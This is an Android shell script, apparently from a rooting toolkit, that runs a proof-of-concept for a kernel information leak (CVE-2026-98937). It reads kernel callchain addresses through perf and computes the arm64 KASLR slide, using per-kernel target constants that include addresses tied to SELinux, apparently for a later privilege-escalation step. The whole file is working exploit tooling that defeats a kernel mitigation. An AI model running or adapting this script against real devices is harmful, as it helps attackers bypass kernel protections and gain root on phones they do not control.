#!/system/bin/sh
# CVE-2026-98937 KASLR slide oracle (optional MagicRoot template).
# Read-only perf callchain leak -> 2 MiB-aligned arm64 slide candidates ->
# unique slide.  Never writes kernel memory and never needs root.
set -u
DIR=$(cd "$(dirname "$0")" && pwd)
D=${MAGICROOT_DEVICE_DIR:-/data/local/tmp/magic}
POC=${MAGICROOT_98937_POC:-$DIR/poc98937}
TOOL=${MAGICROOT_98937_SLIDE_BIN:-$DIR/slide98937}
KERNEL=$(uname -r 2>/dev/null || echo unknown)
SECS=${MAGICROOT_98937_SECONDS:-2}
PERIOD=${MAGICROOT_98937_PERIOD:-1000}
TIMEOUT=${MAGICROOT_98937_TIMEOUT:-45}
TEXT=${MAGICROOT_98937_TEXT:-}
END=${MAGICROOT_98937_END:-}
BASE=${MAGICROOT_98937_BASE:-}
PREP=${MAGICROOT_98937_PREPARE_LINK:-}
SEL=${MAGICROOT_98937_SELINUX_LINK:-}
BOOT_ID=""
[ -r /proc/sys/kernel/random/boot_id ] && BOOT_ID=$(cat /proc/sys/kernel/random/boot_id 2>/dev/null)

if [ -z "$TEXT" ] || [ -z "$END" ]; then
    if [ -f "$DIR/targets.conf" ]; then
        while read -r k t e b pr se rest; do
            case "$k" in ''|'#'*) continue ;; esac
            if [ "$k" = "$KERNEL" ]; then
                TEXT=$t; END=$e; BASE=${b:--}
                [ -z "$PREP" ] && PREP=$pr
                [ -z "$SEL" ] && SEL=$se
                break
            fi
        done < "$DIR/targets.conf"
    fi
fi
case "$TEXT" in 0x*) ;; *) echo "KASLR_ERROR=no_target_constants kernel=$KERNEL"; exit 6 ;; esac
case "$END" in 0x*) ;; *) echo "KASLR_ERROR=no_target_constants kernel=$KERNEL"; exit 6 ;; esac
[ -x "$POC" ] || { echo "KASLR_ERROR=missing_poc path=$POC"; exit 6; }
[ -x "$TOOL" ] || { echo "KASLR_ERROR=missing_slide_tool path=$TOOL"; exit 6; }

OUT=$(timeout "$TIMEOUT" "$POC" --force --duration "$SECS" --period "$PERIOD" 2>&1)
RC=$?
printf '%s\n' "$OUT" | grep -E '^\[env\]|^\[cfg\]|^\[A\]|^\[B\]|^\[C\] samples=|^\[C\] first kernel ip:|^\[C\] first kernel callchain addresses:|^\[verdict\]' | tail -8
CC=$(printf '%s\n' "$OUT" | sed -n 's/^\[C\] first kernel callchain addresses: //p' | tail -1)
if [ -z "$CC" ]; then
    echo "KASLR_ERROR=no_callchain poc_rc=$RC"
    exit 3
fi
ADDRS=""
for a in $CC; do
    case "$a" in 0x*) ADDRS="$ADDRS $a" ;; esac
done
[ -n "$ADDRS" ] || { echo "KASLR_ERROR=no_addresses"; exit 3; }

if [ -n "$PREP" ] && [ -n "$SEL" ]; then
    if [ "$BASE" = "-" ]; then
        "$TOOL" --text "$TEXT" --end "$END" \
            --prepare-link "$PREP" --selinux-link "$SEL" $ADDRS
    else
        "$TOOL" --text "$TEXT" --end "$END" --base "$BASE" \
            --prepare-link "$PREP" --selinux-link "$SEL" $ADDRS
    fi
else
    if [ "$BASE" = "-" ]; then
        "$TOOL" --text "$TEXT" --end "$END" $ADDRS
    else
        "$TOOL" --text "$TEXT" --end "$END" --base "$BASE" $ADDRS
    fi
fi
TRC=$?
if [ -n "$BOOT_ID" ] && [ -d "$D" ]; then
    { echo "boot_id=$BOOT_ID"; echo "kernel=$KERNEL";
      printf '%s\n' "$OUT" | grep -E '^\[verdict\]|^\[C\] first kernel callchain addresses:';
    } > "$D/kaslr-98937.txt" 2>/dev/null || true
fi
exit $TRC
